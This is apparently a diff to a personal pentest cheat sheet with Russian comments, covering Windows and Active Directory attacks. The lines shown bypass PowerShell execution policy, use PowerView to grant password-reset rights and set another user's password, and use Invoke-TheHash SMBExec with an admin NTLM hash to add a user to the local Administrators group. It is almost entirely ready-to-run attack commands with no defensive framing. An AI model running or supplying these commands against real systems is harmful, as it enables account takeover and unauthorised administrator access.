@@ -1,3 +1,7 @@
+# Обход блокировка скрипта
+
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+
 # POWER
 
 https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/
@@ -129,5 +133,11 @@ Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights Reset
 $passwd = ConvertTo-SecureString 'Password123' -AsPlainText -Force
 Set-DomainUserPassword Herman -AccountPassword $passwd -Verbose
 
+# Запуск процесса зная хеш админа!!!!
 
+https://github.com/Kevin-Robertson/Invoke-TheHash
+
+Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
+cd .\Invoke-TheHash\;Import-Module .\Invoke-TheHash.psm1
+Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators max /add"
 
